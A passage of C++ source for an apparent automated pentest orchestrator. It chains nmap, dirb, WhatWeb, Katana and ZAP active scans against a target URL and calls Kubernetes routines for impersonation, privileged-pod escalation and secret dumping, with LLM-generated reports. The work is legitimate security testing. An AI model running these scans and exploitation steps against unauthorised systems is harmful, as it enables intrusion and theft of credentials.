// ===== B — Inventory / Findings only =====
{
    fs::path findings_json;
    if (!generate_findings_only(wd, findings_json)) {
        logerr("Failed to generate K8S findings-only JSON");
    } else {
        // (Optionnel) Si tu veux éviter le gros dump :
        // // run_kubectl_json({"cluster-info","dump","-o","json"}, wd / "k8s_inventory.json");

        // (Optionnel) Tu peux aussi commenter l'appel kubescape si tu veux vraiment un résultat "léger"
        // std::string out, err;
        // run_k8s_tool(exe_kubescape, {"scan","framework","nsa,mitre","--format","json","--output",
        //              (wd/"k8s_kubescape.json").string()}, wd / "k8s_kubescape.json", out, err);
    }
}

    // ===== C — kube-bench via Job =====
    {
        k8s_prepare_kube_bench_namespace(wd);
        k8s_run_kube_bench_job(wd);
    }

    // ===== D — RBAC : analyse + preuves =====
    {
        std::string out, err;
        run_k8s_tool(exe_rbac_police, {"--format","json"}, wd / "rbac_police_report.json", out, err);

        const std::vector<std::string> verbs = {"get","list","create","delete","impersonate"};
        for (const auto& v : verbs) {
            run_k8s_tool(exe_whocan, {v, "pods", "-A"}, wd / ("rbac_whocan_" + v + ".txt"), out, err);
        }
        run_k8s_tool(exe_whocan, {"get","secrets","-A"}, wd / "rbac_whocan_get_secrets.txt", out, err);
        run_k8s_tool(exe_whocan, {"create","pods/exec","-A"}, wd / "rbac_whocan_create_podsexec.txt", out, err);
    }

    // ===== E — Exploitation réelle =====
    {
        k8s_try_impersonation(wd / "exploit_impersonation.txt");
        k8s_try_privileged_pod(wd, "redteam", "privesc-pod");
        k8s_dump_secrets(wd);
        std::string out, err;
        run_k8s_tool(exe_kubeletctl, {"scan", opt.host}, wd / "k8s_kubelet_rescan.txt", out, err);
    }

    // ===== F — Récapitulatif console =====
    {
        std::vector<std::pair<std::string,std::string>> rows;
        rows.push_back({"inventory",              (wd/"k8s_inventory.json").string()});
        rows.push_back({"kubescape",              (wd/"k8s_kubescape.json").string()});
        rows.push_back({"kube-bench",             (wd/"k8s_kube_bench.json").string()});
        rows.push_back({"rbac-police",            (wd/"rbac_police_report.json").string()});
        rows.push_back({"who-can (pods/secrets)", (wd/"rbac_whocan_get_secrets.txt").string()});
        rows.push_back({"impersonation test",     (wd/"exploit_impersonation.txt").string()});
        rows.push_back({"privileged pod POC",     (wd/"privesc-pod_result.txt").string()});
        rows.push_back({"secrets dump",           (wd/"k8s_secrets_dump.yaml").string()});
        rows.push_back({"kubelet scan",           (wd/"k8s_kubelet_findings.txt").string()});
        print_kv_table(rows, std::unordered_set<std::string>{"kube-bench","rbac-police","privileged pod POC"});
    }

    // ===== G — Rapports MCP (CLI + Markdown) =====
    {
        // 1) Collecte récursive
        std::vector<fs::path> report_files;
        try {
            if (fs::exists(wd)) {
                for (auto &p : fs::recursive_directory_iterator(wd)) {
                    if (p.is_regular_file()) report_files.push_back(p.path());
                }
            }
        } catch (...) {}

        std::cout << ansi::sky << "[K8S] Files to inject into MCP: "
                  << ansi::white << report_files.size()
                  << ansi::reset << std::endl;

        if (report_files.empty()) {
            std::cerr << ansi::red << "WARN: no files found under " << wd.string()
                      << " — MCP reports may be empty." << ansi::reset << std::endl;
        }

        // 2) Dossier rapport + templates
        fs::path report_dir = fs::path(opt.outdir) / "report";
        try { fs::create_directories(report_dir); } catch(...) {}

        const std::string TPL_K8S_CLI = "prompt-rapport-k8s.txt";
        const std::string TPL_K8S_MD  = "prompt-rapport-k8s-md.txt";

        // 3) Sorties
        fs::path cli_out = report_dir / (hostpart + "_" + ts + "_k8s_report.txt");
        fs::path md_out  = report_dir / (hostpart + "_" + ts + "_k8s_report.md");

        // 4) Rapport CLI — imprime déjà sur console
        {
            std::string report_cli_raw;
            std::cout << ansi::green << "[K8S] Pentest report generation (CLI)..." << ansi::reset << std::endl;

            bool ok_cli = call_mcp_report_with_files(
                opt.mcp_path,
                get_exe_parent_dir(),
                report_files,
                TPL_K8S_CLI,
                report_cli_raw
            );

            // Sauvegarde .txt
            try { std::ofstream ofs(cli_out, std::ios::binary); ofs << report_cli_raw; } catch(...) {}

            if (!ok_cli) {
                logerr("Failed to generate K8s CLI report via " + TPL_K8S_CLI);
            } else {
                std::vector<std::pair<std::string,std::string>> rows_cli;
                rows_cli.push_back({"K8S CLI report", cli_out.string()});
                print_kv_table(rows_cli, std::unordered_set<std::string>{"K8S CLI report"});
            }
        }

        // 5) Rapport MARKDOWN — fichier uniquement
        {
            std::string report_md_raw;
            std::cout << ansi::green << "[K8S] Pentest report generation (Markdown)..." << ansi::reset << std::endl;

            bool ok_md = call_mcp_report_with_files(
                opt.mcp_path,
                get_exe_parent_dir(),
                report_files,
                TPL_K8S_MD,
                report_md_raw,
                md_out
            );

            if (!ok_md) {
                logerr("Failed to generate K8s Markdown report via " + TPL_K8S_MD);
            } else {
                std::vector<std::pair<std::string,std::string>> rows_md;
                rows_md.push_back({"K8S Markdown report", md_out.string()});
                rows_md.push_back({"All outputs (root)", wd.string()});
                print_kv_table(rows_md, std::unordered_set<std::string>{"K8S Markdown report","All outputs (root)"});
            }
        }
    }

    std::cout << ansi::green << "[K8S] Done. Outputs -> " << ansi::white << wd.string() << ansi::reset << "\n";
    return true;
}

// -----------------------------------------------------------------------------
// Web Recon Chain (Linux/Posix & Windows support via run_command_capture)
// Exécute: dig, nmap (ports+services), nmap NSE headers, waybackurls, whatweb, dirb
// Stocke toutes les sorties dans 'workdir' et renvoie la liste des fichiers produits
// -----------------------------------------------------------------------------
static bool run_recon_web_chain(const std::string& baseurl,
                                const fs::path& workdir,
                                std::vector<fs::path>& produced_files)
{
    produced_files.clear();
    const std::string host = extract_hostname(baseurl);           // ex: "example.com" ou "10.0.0.5"
    const std::string scheme = (baseurl.rfind("https://",0)==0) ? "https" : "http";
    const std::string webroot = scheme + "://" + host + "/";

    auto write_out = [&](const fs::path& outpath, const std::string& content){
        try { fs::create_directories(outpath.parent_path()); std::ofstream f(outpath, std::ios::binary); f<<content; produced_files.push_back(outpath); }
        catch(...) {}
    };

    loginfo(std::string(ansi::sky) + "[RECON] Chain start on " + host + ansi::reset);

    // ---------- 1) DIG (A/AAAA/NS/MX, réponse concise) ----------
    {
        std::string so, se, cmd;
#ifdef _WIN32
        // dig sous Windows peu probable. On garde une commande POSIX par défaut si dispo dans PATH (MSYS).
        cmd = "sh -c \"{ dig +noall +answer A " + host + " ; "
              "dig +noall +answer AAAA " + host + " ; "
              "dig +noall +answer NS " + host + " ; "
              "dig +noall +answer MX " + host + " ; } 2>&1\"";
#else
        cmd = "{ dig +noall +answer A " + host + " ; "
              "dig +noall +answer AAAA " + host + " ; "
              "dig +noall +answer NS " + host + " ; "
              "dig +noall +answer MX " + host + " ; }";
#endif
        run_command_capture(cmd, so, se, 0, false);
        write_out(workdir/"recon_dig.txt", so + "\n" + se);
    }

    // ---------- 2) Résolution IP(s) pour Nmap ----------
    std::vector<std::string> ips; {
        std::string so, se;
#ifdef _WIN32
        // essai via nslookup (fallback)
        run_command_capture("nslookup " + host, so, se, 0, false);
        // extraction simple (IPv4)
        std::regex re("(?:Address:|Addresses:)\\s*([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)");
        std::smatch m; std::string s = so + "\n" + se; auto it = std::sregex_iterator(s.begin(), s.end(), re), end = std::sregex_iterator();
        for (; it != end; ++it) ips.push_back((*it)[1].str());
#else
        run_command_capture("getent ahosts " + host + " | awk '{print $1}' | sort -u", so, se, 0, false);
        std::istringstream iss(so); std::string ip;
        while (iss >> ip) ips.push_back(ip);
#endif
        if (ips.empty()) ips.push_back(host); // on tente quand même (peut être déjà une IP)
        std::ostringstream joined; for (size_t i=0;i<ips.size();++i){ if(i) joined<<","; joined<<ips[i]; }
        write_out(workdir/"recon_resolved_ips.txt", joined.str());
    }

    // ---------- 3) Nmap global (ports) + détection de services ----------
    // Puissant mais raisonnable: scan complet TCP connect (), agressif, avec bannières
    {
        std::string targets; for (size_t i=0;i<ips.size();++i){ if(i) targets+=' '; targets+=ips[i]; }
        std::string so, se;

        // a) Top ports + version
        run_command_capture("nmap -Pn -sT -sV --version-light --top-ports 200 -T4 " + targets,
                            so, se, 0, false);
        write_out(workdir/"recon_nmap_top200_sv.txt", so + "\n" + se);

        // b) Full range (peut durer, mais utile) — version sur découvert
        //   Tactique: on génère un fichier normal, l’utilisateur gardera le résultat
        so.clear(); se.clear();
        run_command_capture("nmap -Pn -sT -sV -p 1-65535 --min-rate 1200 -T4 " + targets,
                            so, se, 0, false);
        write_out(workdir/"recon_nmap_full_sv.txt", so + "\n" + se);
    }

    // ---------- 4) NSE: en-têtes HTTP (host header / security headers) ----------
    {
        std::string so, se;
        // ports web usuels
        run_command_capture("nmap -Pn -sT -p 80,443,8080,8443 --script http-headers,http-security-headers " + host,
                            so, se, 0, false);
        write_out(workdir/"recon_nmap_http_headers.txt", so + "\n" + se);
    }

    // ---------- 5) waybackurls (historique d’URL publiques) ----------
    {
        std::string so, se;
#ifdef _WIN32
        run_command_capture("sh -c \"printf '%s\\n' " + webroot + " | waybackurls | sort -u\"", so, se, 0, false);
#else
        run_command_capture("printf '%s\\n' " + webroot + " | waybackurls | sort -u", so, se, 0, false);
#endif
        write_out(workdir/"recon_waybackurls.txt", so);
    }

    // ---------- 6) WhatWeb (fingerprinting agressif + logs) ----------
    {
        std::string so, se;
        // JSON + verbose pour exploitation automatique
        run_command_capture("whatweb -v -a 3 --log-json=" + quote((workdir/"recon_whatweb.json").string())
                            + " --log-verbose=" + quote((workdir/"recon_whatweb_verbose.log").string())
                            + " " + webroot,
                            so, se, 0, false);
        // on ajoute aussi STDOUT/STDERR pour la trace
        write_out(workdir/"recon_whatweb_stdout.txt", so + "\n" + se);
        produced_files.push_back(workdir/"recon_whatweb.json");
        produced_files.push_back(workdir/"recon_whatweb_verbose.log");
    }

    // ---------- 7) Dirb (bruteforce répertoires) ----------
    {
        // wordlist par défaut, robuste sur Ubuntu/Kali
        fs::path wl1 = "/usr/share/dirb/wordlists/common.txt";
        fs::path wl2 = "/usr/share/wordlists/dirb/common.txt";
        fs::path picked = fs::exists(wl1) ? wl1 : (fs::exists(wl2) ? wl2 : fs::path());

        std::string so, se, cmd = "dirb " + webroot;
        if (!picked.empty()) cmd += " " + quote(picked.string());
        cmd += " -r -S -o " + quote((workdir/"recon_dirb_common.txt").string());

        run_command_capture(cmd, so, se, 0, false);
        // dirb écrit déjà le .txt mais on logge aussi STDOUT/ERR
        write_out(workdir/"recon_dirb_stdout.txt", so + "\n" + se);
        produced_files.push_back(workdir/"recon_dirb_common.txt");
    }

    loginfo(std::string(ansi::green) + "[RECON] Chain completed" + ansi::reset);
    return true;
}

// Résolution binaire katana (./kube/katana prioritaire)
static std::string resolve_katana_bin(const std::string& explicit_path){
    if(!explicit_path.empty()) return explicit_path;
#ifdef _WIN32
    fs::path p1 = g_kube_dir / "katana.exe";
    fs::path p2 = g_kube_dir / "katana";
    if (fs::exists(p1)) return p1.string();
    if (fs::exists(p2)) return p2.string();
    return "katana.exe";
#else
    fs::path p1 = g_kube_dir / "katana";
    if (fs::exists(p1)) return p1.string();
    return "katana";
#endif
}

// URL-encode minimal pour l’API ZAP (espace, #, %, ?, & …)
static std::string url_encode(const std::string& s){
    static const char hex[] = "0123456789ABCDEF";
    std::string o; o.reserve(s.size()*3);
    for(unsigned char c: s){
        if( (c>='A'&&c<='Z') || (c>='a'&&c<='z') || (c>='0'&&c<='9') || c=='-'||c=='_'||c=='.'||c=='~'){
            o.push_back((char)c);
        }else{
            o.push_back('%'); o.push_back(hex[c>>4]); o.push_back(hex[c&15]);
        }
    }
    return o;
}

// Exécute Katana et produit un fichier URL (une URL/ligne)
static bool run_katana_to_file(const std::string& katana_bin,
                               const std::string& baseurl,
                               const std::vector<std::string>& user_args,
                               const fs::path& out_file,
                               std::string& so, std::string& se)
{
    std::ostringstream cmd;
    cmd << '"' << katana_bin << '"' << " -u " << '"' << baseurl << '"'
        << " -silent -no-color"; // ⬅️ retiré: -retries 2

    // pass-through intégral (mets-y -proxy http://IP:PORT depuis la CLI)
    for (const auto& a : user_args) cmd << " " << a;

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 0, false);
    so = out; se = err;

    try {
        fs::create_directories(out_file.parent_path());
        std::ofstream ofs(out_file);
        ofs << out;
    } catch (...) {}

    if (!ok || (out.empty() && !err.empty())) {
        logerr(std::string("[KATANA] failed: ") + cmd.str() + "\n" + err);
    }
    return ok;
}
// Appelle ZAP /JSON/core/action/accessUrl pour chaque URL (via curl)
static bool zap_access_urls_bulk(const std::string& host, uint16_t port,
                                 const std::string& apikey,
                                 const std::vector<std::string>& urls)
{
#ifndef _WIN32
    for(const auto& u : urls){
        if(u.empty()) continue;
        std::ostringstream curl;
        curl << "curl -sS --max-time 20 "
             << "\"http://" << host << ":" << port
             << "/JSON/core/action/accessUrl/?url=" << url_encode(u)
             << "&followredirects=true";
        if(!apikey.empty()) curl << "&apikey=" << url_encode(apikey);
        curl << "\"";
        std::string so,se;
        run_command_capture(curl.str(), so, se, 30000, false);
        std::this_thread::sleep_for(std::chrono::milliseconds(40)); // évite de saturer ZAP
    }
    return true;
#else
    // Windows: si curl n’est pas dispo, on tente via PowerShell Invoke-WebRequest
    for(const auto& u : urls){
        std::ostringstream ps;
        ps << "powershell -NoLogo -NoProfile -Command "
           << "\"$u='http://" << host << ":" << port
           << "/JSON/core/action/accessUrl/?url=" << url_encode(u)
           << "&followredirects=true";
        if(!apikey.empty()) ps << "&apikey=" << url_encode(apikey);
        ps << "'; try { iwr -UseBasicParsing $u | Out-Null } catch {}\"";
        std::string so,se;
        run_command_capture(ps.str(), so, se, 30000, false);
        std::this_thread::sleep_for(std::chrono::milliseconds(40));
    }
    return true;
#endif
}

// -----------------------------------------------------------------------------
// Orchestrateur Web (ZAP-CLI + MCP)
// -----------------------------------------------------------------------------
// -----------------------------------------------------------------------------
// Orchestrateur Web (ZAP-CLI + MCP) — avec intégration Katana optionnelle
// -----------------------------------------------------------------------------
// -----------------------------------------------------------------------------
// Orchestrateur Web (ZAP-CLI + MCP) — avec intégration Katana optionnelle
// ET fallback robuste si MCP ne fournit pas d'URLs
// -----------------------------------------------------------------------------
static bool run_agentfactory(const AgentOptions &opt){
    // Banner
    print_dark_moon();
    loginfo(std::string(ansi::sky) + "AgentFactory start (delegating to ZAP-CLI: " + opt.zapcli_path + ")" + ansi::reset);

    // per-run workdir
    std::string hostpart = extract_hostname(opt.baseurl);
    std::string ts = current_datetime_string();
    fs::path workdir = fs::path(opt.outdir) / (hostpart + "_" + ts);
    try {
        fs::create_directories(workdir);
    } catch (const std::exception &ex) {
        logerr(std::string("Failed to create output dir: ") + ex.what());
        return false;
    }

    std::cout << ansi::green << "Workdir:" << ansi::reset
              << " " << ansi::white << workdir.string() << ansi::reset << std::endl;

    // -------------------------------------------------------------
    // 0) Helpers inline
    // -------------------------------------------------------------
    auto http_status = [&](const std::string& url)->int{
        // Renvoie le code HTTP (0 si inconnu). On accepte 2xx/3xx comme "OK".
        std::string so, se;
#ifdef _WIN32
        // Essai curl (souvent présent sur Win10+)
        std::string cmd = "curl -sS -o NUL -w \"%{http_code}\" -L --max-time 10 " + quote(url);
        run_command_capture(cmd, so, se, 15000, false);
        int code = 0;
        if (!so.empty()) {
            try { code = std::stoi(so.substr(0,3)); } catch(...) { code = 0; }
        }
        // Fallback PowerShell si code nul
        if (code == 0) {
            so.clear(); se.clear();
            std::ostringstream ps;
            ps << "powershell -NoLogo -NoProfile -Command "
               << "\"$u=" << quote(url) << ";"
               << "try { $r=Invoke-WebRequest -UseBasicParsing -Method Head -MaximumRedirection 5 -TimeoutSec 10 -Uri $u; "
               << "if($r.StatusCode){ $r.StatusCode } else { 200 } } "
               << "catch { if($_.Exception.Response -and $_.Exception.Response.StatusCode){ "
               << "$_.Exception.Response.StatusCode.Value__ } else { 0 } }\"";
            run_command_capture(ps.str(), so, se, 20000, false);
            try { code = std::stoi(so); } catch(...) { code = 0; }
        }
        return code;
#else
        // POSIX -> curl
        std::ostringstream c;
        c << "curl -sS -o /dev/null -w \"%{http_code}\" -L --max-time 10 " << quote(url);
        run_command_capture(c.str(), so, se, 15000, false);
        int code = 0;
        if (!so.empty()) {
            try { code = std::stoi(so.substr(0,3)); } catch(...) { code = 0; }
        }
        return code;
#endif
    };

    auto is_good_code = [&](int code)->bool { return code >= 200 && code < 400; };

    auto dedup_push = [](std::unordered_set<std::string>& seen, std::vector<std::string>& vec, const std::string& u){
        if (u.size() < 10) return;
        if (seen.insert(u).second) vec.push_back(u);
    };

    // -------------------------------------------------------------
    // 1) Katana FIRST: découverte + filtre des URLs qui répondent
    // -------------------------------------------------------------
    std::vector<std::string> katana_urls_ok;
    std::unordered_set<std::string> seen_ok;

    if (g_use_katana) {
        std::cout << ansi::green << "[KATANA] Start crawling (first)..." << ansi::reset << std::endl;

        const std::string katana_bin = resolve_katana_bin(g_katana_bin_explicit);
        std::string so, se;
        fs::path katana_out = workdir / "recon_katana_urls.txt";

        if (!run_katana_to_file(katana_bin, opt.baseurl, g_katana_passthrough, katana_out, so, se)) {
            logerr("[KATANA] execution failed — continuing without Katana URLs.");
        } else {
            // Charge et filtre par code HTTP
            std::string ktxt = readFile(katana_out.string());
            std::istringstream iss(ktxt);
            std::string line; int tested=0, okcnt=0;

            while (std::getline(iss, line)) {
                if (line.size() < 10) continue;
                // Petit nettoyage (espaces)
                while (!line.empty() && (line.back()=='\r' || line.back()==' ')) line.pop_back();
                if (line.empty()) continue;

                int code = http_status(line);
                tested++;
                if (is_good_code(code)) {
                    dedup_push(seen_ok, katana_urls_ok, line);
                    okcnt++;
                }
            }

            // Sauvegarde liste filtrée
            try {
                std::ofstream okf(workdir / "recon_katana_urls_ok.txt");
                for (auto &u : katana_urls_ok) okf << u << "\n";
            } catch(...) {}

            std::vector<std::pair<std::string,std::string>> rows;
            rows.emplace_back("Katana discovered (raw)", std::to_string(tested));
            rows.emplace_back("Katana OK (2xx/3xx)", std::to_string((int)katana_urls_ok.size()));
            print_kv_table(rows, {"Katana discovered (raw)","Katana OK (2xx/3xx)"});
        }
    }

    // -------------------------------------------------------------
    // 2) Warm-up passif ZAP: URLs Katana OK (ou fallback seeds)
    // -------------------------------------------------------------
    if (!katana_urls_ok.empty()) {
        std::cout << ansi::sky << "[ZAP] Passive warm-up with Katana OK URLs (" 
                  << katana_urls_ok.size() << ")" << ansi::reset << std::endl;
        zap_access_urls_bulk(opt.host, opt.port, opt.apikey, katana_urls_ok);
    } else {
        // Fallback minimal si Katana n'a rien trouvé
        std::vector<std::string> seeds = {
            opt.baseurl,
            opt.baseurl + (opt.baseurl.back()=='/'? "" : "/")
        };
        std::cout << ansi::sky << "[ZAP] Passive warm-up with seeds (fallback)" << ansi::reset << std::endl;
        zap_access_urls_bulk(opt.host, opt.port, opt.apikey, seeds);
    }

    // Petit spider court pour étoffer le passif (best-effort, non bloquant)
    {
        std::string so,se;
        run_zapcli(opt.zapcli_path, opt.host, opt.port, opt.apikey, opt.baseurl, "spider", workdir, so, se);
    }

    // -------------------------------------------------------------
    // 3) Récup passif: ZAP-CLI list -> alerts_*.json
    // -------------------------------------------------------------
    std::string out, err;
    if (!run_zapcli(opt.zapcli_path, opt.host, opt.port, opt.apikey, opt.baseurl, "list", workdir, out, err)) {
        logerr("ZAP-CLI 'list' invocation failed. stdout/stderr:\n" + out + "\n" + err);
        // On continue malgré tout; le flow MCP/recon peut encore servir
    }

    fs::path alerts_path = find_latest_alerts_json(workdir);
    json alerts_before = json::object();
    alerts_before["alerts"] = json::array();

    if (!alerts_path.empty()) {
        try {
            std::string txt = readFile(alerts_path.string());
            alerts_before = json::parse(txt);
        } catch (const std::exception &ex) {
            logerr(std::string("Failed to parse alerts JSON: ") + ex.what());
        }
    } else {
        logerr("No alerts_*.json produced by ZAP-CLI in " + workdir.string());
        loginfo("ZAP-CLI stdout:\n" + out + "\n" + err);
    }

    // Filtre Medium/High
    json filtered; filtered["alerts"] = json::array();
    if (alerts_before.contains("alerts") && alerts_before["alerts"].is_array()) {
        for (const auto &a : alerts_before["alerts"]) {
            std::string risk = a.value("risk", "");
            if (risk == "Medium" || risk == "High") filtered["alerts"].push_back(a);
        }
    }
    fs::path filtered_path = workdir / "alerts_filtered.json";
    try { std::ofstream f(filtered_path); f << std::setw(2) << filtered; } catch (...) {
        logerr("Failed to write alerts_filtered.json");
    }

    // Récap compact
    print_compact_alerts_summary(alerts_before, workdir);

    // -------------------------------------------------------------
    // 4) RECON (après warm-up passif, comme demandé: "et enchaîner avec le reste")
    // -------------------------------------------------------------
    std::vector<fs::path> recon_files;
    std::cout << ansi::sky << "[RECON] Launching chained reconnaissance..." << ansi::reset << std::endl;
    run_recon_web_chain(opt.baseurl, workdir, recon_files);
    if (!recon_files.empty()) {
        std::vector<std::pair<std::string,std::string>> rrows;
        for (const auto& p : recon_files) rrows.emplace_back("recon", p.filename().string());
        print_kv_table(rrows, {"recon"});
    }

    // Wayback fusion plus tard
    std::string wayback_txt = readFile((workdir/"recon_waybackurls.txt").string());

    // -------------------------------------------------------------
    // 5) Phase MCP (+ fallback) pour construire la targetlist d'AScan
    // -------------------------------------------------------------
    fs::path exe_parent = get_exe_parent_dir();
    std::string sanitized = opt.baseurl; 
    std::replace(sanitized.begin(), sanitized.end(), '/', '_'); 
    std::replace(sanitized.begin(), sanitized.end(), ':', '_');
    fs::path mcp_urls = workdir / ("mcp_urls_" + sanitized + ".json");

    // Affichage MCP (non bloquant)
    {
        std::string mcp_display_raw;
        call_mcp_display_with_file(opt.mcp_path, filtered_path, exe_parent, mcp_display_raw);
    }

    bool filtered_has_alerts = false;
    try {
        std::string ft = readFile(filtered_path.string());
        json fj = json::parse(ft, nullptr, false);
        filtered_has_alerts = ( !fj.is_discarded() && fj.contains("alerts") && fj["alerts"].is_array() && !fj["alerts"].empty() );
    } catch(...) {}

    json mcp_j; 
    mcp_j["urls"] = json::array();

    if (filtered_has_alerts) {
        std::string mcp_out;
        if (call_mcp_analyze(opt.mcp_path, filtered_path, mcp_urls, mcp_out)) {
            try {
                std::string txt = readFile(mcp_urls.string());
                json tmp = json::parse(txt, nullptr, false);
                if (!tmp.is_discarded() && tmp.contains("urls") && tmp["urls"].is_array() && !tmp["urls"].empty()) {
                    mcp_j = std::move(tmp);
                }
            } catch(...) {}
        }
    }

    // Fallback seed si MCP vide
    if (!mcp_j.contains("urls") || !mcp_j["urls"].is_array() || mcp_j["urls"].empty()) {
        mcp_j = json::object();
        mcp_j["urls"] = json::array({
            { {"url", opt.baseurl}, {"justification", "Bootstrap: base URL"} }
        });
    }

    // Merge des URLs Katana OK (priorisées), déduplication
    {
        std::unordered_set<std::string> seen;
        for (auto &e : mcp_j["urls"]) if (e.contains("url")) seen.insert(e["url"].get<std::string>());
        int added=0;
        for (const auto& u : katana_urls_ok) {
            if (seen.insert(u).second) {
                mcp_j["urls"].push_back(json{{"url", u}, {"justification", "Discovered via katana (OK)"}}); 
                added++;
            }
        }
        if (added>0) {
            try { std::ofstream ofs(mcp_urls); ofs << std::setw(2) << mcp_j; } catch(...) {}
            std::cout << ansi::green << "[KATANA] Merged " << added << " Katana OK URLs into target list" << ansi::reset << std::endl;
        }
    }

    // Fusion avec WaybackURLs
    try {
        std::string txt = readFile(mcp_urls.string());
        json j = json::parse(txt, nullptr, false);
        if (!j.is_discarded()) {
            std::istringstream iss(wayback_txt);
            std::string line; int added=0;
            std::unordered_set<std::string> seen;
            if (j.contains("urls") && j["urls"].is_array()) {
                for (auto& u : j["urls"]) if (u.contains("url")) seen.insert(u["url"].get<std::string>());
            }
            while (std::getline(iss, line)) {
                if (line.size() < 10) continue;
                if (seen.insert(line).second) {
                    j["urls"].push_back(json{{"url", line}, {"justification", "Discovered via waybackurls"}});
                    added++;
                }
            }
            if (added > 0) {
                std::ofstream ofs(mcp_urls); ofs << std::setw(2) << j;
                std::cout << ansi::green << "[RECON] Added " << added
                          << " wayback URLs into MCP target list" << ansi::reset << std::endl;
            }
            mcp_j = std::move(j);
        }
    } catch (...) {}

    // -------------------------------------------------------------
    // 6) Active Scan (ascan) sur chaque URL de la liste finale
    // -------------------------------------------------------------
    print_header_box("Start Pentest");

    fs::path last_active_alerts;

    for (const auto &entry : mcp_j["urls"]) {
        if (!entry.contains("url")) continue;
        std::string target = entry.value("url", std::string());
        std::string justification = entry.value("justification", std::string());

        print_target_box(target, justification);

        std::string out2, err2;
        bool ok_ascan = run_zapcli_ascan_progress(opt.zapcli_path, opt.host, opt.port, opt.apikey, target, workdir, out2, err2);
        if (!ok_ascan) {
            logerr("ZAP-CLI ascan failed for target: " + target);
            continue;
        }

        fs::path latest_alerts_after = find_latest_alerts_json(workdir);
        if (!latest_alerts_after.empty()) last_active_alerts = latest_alerts_after;

        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }

    // -------------------------------------------------------------
    // 7) Final: table, rapports MCP (CLI + HTML)
    // -------------------------------------------------------------
    std::cout << ansi::green << "[+] Saving..." << ansi::reset << std::endl;
    std::vector<std::pair<std::string,std::string>> rows;
    fs::path final_active;

    std::string sanitized2 = opt.baseurl;
    std::replace(sanitized2.begin(), sanitized2.end(), '/', '_');
    std::replace(sanitized2.begin(), sanitized2.end(), ':', '_');

    if (!last_active_alerts.empty()) {
        try {
            final_active = workdir / ("active_alerts_" + sanitized2 + "_final.json");
            fs::copy_file(last_active_alerts, final_active, fs::copy_options::overwrite_existing);
        } catch(...) { final_active.clear(); }
    }

    std::vector<fs::path> msg_files = find_message_files(workdir);

    rows.push_back({"active alerts", final_active.empty() ? std::string("(not found)") : final_active.string()});

    if (!msg_files.empty()) {
        rows.push_back({"Proof of Exploit", msg_files[0].filename().string()});
        for (size_t i = 1; i < msg_files.size(); ++i) rows.push_back({"", msg_files[i].filename().string()});
    } else {
        rows.push_back({"Proof of Exploit", std::string("(none)")});
    }
    print_kv_table(rows, std::unordered_set<std::string>{"active alerts", "Proof of Exploit"});

    // Rapports
    std::vector<fs::path> report_files;
    for (const auto &p : msg_files) report_files.push_back(p);
    for (const auto &p : recon_files) report_files.push_back(p);

    fs::path latest_alert_file = find_latest_alerts_json(workdir);
    if (report_files.empty()) {
        if (!latest_alert_file.empty()) report_files.push_back(latest_alert_file);
        else {
            logerr("No message_*.json or alerts file available to generate report; skipping report generation.");
            loginfo("All MCP-targeted active scans launched and raw outputs saved to: " + workdir.string());
            return true;
        }
    }

    // CLI/text report
    std::string report_cli_raw;
    std::cout << ansi::green << "[+] Pentest report generation (CLI)..." << ansi::reset << std::endl;
    if (!call_mcp_report_with_files(opt.mcp_path, get_exe_parent_dir(), report_files, "prompt-rapport.txt", report_cli_raw)) {
        logerr("Failed to generate CLI report via prompt-rapport.txt (continuing)");
    }

    // Markdown report
    fs::path report_dir = fs::path(opt.outdir) / "report";
    try { fs::create_directories(report_dir); } catch (...) {}

    std::string hostpart_forfile = extract_hostname(opt.baseurl);
    std::string md_ts = current_datetime_string();
    fs::path md_out = report_dir / (hostpart_forfile + "_" + md_ts + "_report.md");

    std::vector<fs::path> md_report_files;
    if (!msg_files.empty()) {
        for (const auto &p : msg_files) md_report_files.push_back(p);
    } else if (!latest_alert_file.empty()) {
        md_report_files.push_back(latest_alert_file);
    }

    if (!md_report_files.empty()) {
        std::string report_md_raw;
        if (!call_mcp_report_with_files(
                opt.mcp_path,
                get_exe_parent_dir(),
                md_report_files,
                "prompt-rapport-md.txt",   // <- prompt Markdown
                report_md_raw,
                md_out))                   // <- fichier .md en sortie
        {
            logerr("Failed to generate Markdown report via prompt-rapport-md.txt");
        } else {
            std::cout << ansi::green << "[+] Markdown Pentest report generation DONE"
                    << ansi::reset << std::endl;

            std::vector<std::pair<std::string,std::string>> rows2;
            rows2.push_back({"Markdown report", md_out.string()});
            rows2.push_back({"All outputs", workdir.string()});
            print_kv_table(rows2,
                std::unordered_set<std::string>{"Markdown report", "All outputs"});
        }
    } else {
        loginfo("Markdown report skipped due to missing input files.");
    }


    return true;
}

// -----------------------------------------------------------------------------
// CLI options and main (cross-platform)
// -----------------------------------------------------------------------------
struct CLIOptions {
    bool agentfactory=false;
    bool k8s=false;
    std::string mcp;
    std::string zapcli;
    std::string host="localhost";
    uint16_t port=8888;
    std::string apikey;
    std::string baseurl;
    std::string outdir="zap_cli_out";
    bool wait_browse=false;
    // K8s
    std::string kube_dir="kube";
    std::string kubeconfig;
    std::string kubecontext;

    // --- Katana ---
    bool use_katana=false;
    std::string katana_bin;                 // chemin explicite si fourni
    std::vector<std::string> katana_args;   // pass-through intégral après "--"
};

static CLIOptions parse_cli(int argc, char** argv){
    CLIOptions c;
    for(int i=1;i<argc;++i){
        std::string a(argv[i]);
        if(a=="--agentfactory") c.agentfactory=true;
        else if(a=="--k8s") c.k8s=true;
        else if(a=="--mcp" && i+1<argc) c.mcp=argv[++i];
        else if(a=="--zapcli" && i+1<argc) c.zapcli=argv[++i];
        else if(a=="--host" && i+1<argc) c.host=argv[++i];
        else if(a=="--port" && i+1<argc) c.port=(uint16_t)std::stoi(argv[++i]);
        else if(a=="--apikey" && i+1<argc) c.apikey=argv[++i];
        else if(a=="--baseurl" && i+1<argc) c.baseurl=argv[++i];
        else if(a=="--outdir" && i+1<argc) c.outdir=argv[++i];
        else if(a=="--wait-browse") c.wait_browse=true;
        // K8s
        else if(a=="--kube-dir" && i+1<argc) c.kube_dir=argv[++i];
        else if(a=="--kubeconfig" && i+1<argc) c.kubeconfig=argv[++i];
        else if(a=="--context" && i+1<argc) c.kubecontext=argv[++i];

        // --- Katana ---
        else if(a=="--katana") c.use_katana=true;
        else if(a=="--katana-bin" && i+1<argc) c.katana_bin=argv[++i];
        else if(a=="--"){ // tout ce qui suit => args katana pass-through
